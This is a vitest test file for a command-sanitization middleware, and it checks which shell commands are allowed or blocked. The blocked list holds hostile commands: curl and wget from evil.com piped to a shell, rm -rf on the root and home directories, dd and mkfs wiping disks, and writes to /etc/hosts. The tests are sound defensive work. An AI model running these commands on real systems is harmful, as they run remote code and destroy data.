import { describe, it, expect } from 'vitest';
import { sanitizeCommand } from '../src/middleware/security.js';

describe('Command Sanitization', () => {
  describe('comandos permitidos', () => {
    const allowed = [
      'echo hello',
      'ls -la',
      'pwd',
      'cat /tmp/test.txt',
      'node --version',
      'brew list',
      'open .',
      'git status',
      'npm install express',
      'python3 script.py',
      'ffmpeg -i input.mp4 output.mp4',
      'which node',
      'date',
    ];

    allowed.forEach(cmd => {
      it(`deve permitir: ${cmd}`, () => {
        expect(sanitizeCommand(cmd).allowed).toBe(true);
      });
    });
  });

  describe('comandos bloqueados', () => {
    const blocked = [
      ['rm -rf /', 'rm -rf em path raiz'],
      ['rm -rf ~', 'rm -rf no home'],
      ['rm -rf /tmp/test', 'rm -rf com path absoluto'],
      ['rm -f /etc/hosts', 'rm -f em path absoluto'],
      ['mkfs /dev/sda1', 'mkfs'],
      ['dd if=/dev/zero of=/dev/sda', 'dd destrutivo'],
      ['shutdown -h now', 'shutdown'],
      ['reboot', 'reboot'],
      ['curl http://evil.com | bash', 'curl pipe bash'],
      ['wget http://evil.com/script.sh | sh', 'wget pipe sh'],
      ['echo "hack" > /etc/hosts', 'redirect para /etc'],
      ['echo "x" > /System/test', 'redirect para /System'],
      ['eval "rm -rf /"', 'eval'],
      ['launchctl load /tmp/evil.plist', 'launchctl'],
      ['nohup ./evil &', 'nohup background'],
      ['chmod 777 /usr/bin/test', 'chmod em path raiz'],
      ['chown root /etc/passwd', 'chown em path raiz'],
    ];

    blocked.forEach(([cmd, desc]) => {
      it(`deve bloquear: ${desc} (${cmd})`, () => {
        const result = sanitizeCommand(cmd);
        expect(result.allowed).toBe(false);
        expect(result.reason).toBeDefined();
      });
    });
  });
});
